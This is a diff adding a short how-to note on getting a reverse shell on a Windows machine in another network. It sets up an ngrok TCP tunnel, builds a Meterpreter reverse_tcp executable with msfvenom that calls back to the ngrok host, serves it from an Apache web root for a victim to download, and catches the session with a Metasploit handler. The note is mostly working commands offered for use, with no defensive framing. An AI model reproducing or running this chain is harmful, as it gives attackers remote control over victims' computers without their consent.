@@ -1,0 +1,36 @@
+HACKING AND GETTING REVERSE SHELL IN COMPLETE DIFFERENT NETWORK:
+Two ways:
+1.) Port forwarding: (not recommended (requers special routers and external USB WI-FI card)
+2.) Tunneling: That's nice!
+
+NGROK TUNNELING:
+1.) Create account in ngrok.com
+2.) Downlaod it and unzip it on kali Linux
+3.) Be shure that you can see the authentication TOKEN in ngrok.com account
+3.) Activate it using the token command in the ngrok.com account using "./" infront of command!
+4.) Start tcp tunnel --- ./ngrok tcp 4242
+5.) Create backdoor/payload
+6.) Commands: 
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=4.tcp.eu.ngrok.io lport=14961 -f 	      exe -o /root/test.exe
+	TIP!:
+	4.tcp.eu.ngrok.io (it can be different and it is found in ngrok panel we started "./ngrok tcp 4242") lport=14961 (The same thing for "./ngrok tcp 4242" 	the port)
+7.) Copy and paste the "test.exe" file in /var/www/html/Backdoor/ 
+8.) Commands: 
+msfconsole 
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options (optional if needed)
+set LHOST 0.0.0.0
+set LPORT 4242 (use the port in ngrok panel we started with ./ngrok tcp 4242 (HERE WE USE THE PORT FOR localhost in this 	case 4242))
+show options (optional to make shure)
+exploit -j -z (to run the exploit in background)
+systemctl start apace2 (start the web server)
+9.) Go to victim machine and access the webserver in order to download "test.exe" file 
+10.) Session was created:
+
+
+
+
+	      
+
+	
